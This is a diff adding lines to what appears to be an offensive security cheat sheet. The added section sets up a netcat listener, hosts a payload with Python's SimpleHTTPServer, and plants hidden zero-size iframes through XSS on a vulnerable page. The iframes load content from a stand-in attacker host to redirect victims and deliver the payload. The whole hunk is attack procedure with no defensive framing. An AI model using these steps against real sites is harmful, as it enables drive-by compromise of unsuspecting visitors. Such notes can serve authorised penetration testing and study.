@@ -4780,6 +4780,19 @@ sudo python -m SimpleHTTPServer 80
 
 # hidden iframe
 <iframe src=http://attacker_IP_here/path/to/file height=”0” width=”0”></iframe>
+
+# redirect victim to attacker-controlled URL
+## test connection
+### set up listener on attacker machine
+sudo nc -lnvp 80
+### place redirect in XSS on vulnerable page
+<iframe src=http://attacker_IP_here/ height=”0” width=”0”></iframe>
+## exploit
+### prepare payload
+### host payload on web server
+sudo python -m SimpleHTTPServer 80
+### place redirect in XSS on vulnerable page
+<iframe src=http://attacker_IP_here/path/to/payload height=”0” width=”0”></iframe>
 ```
 
 
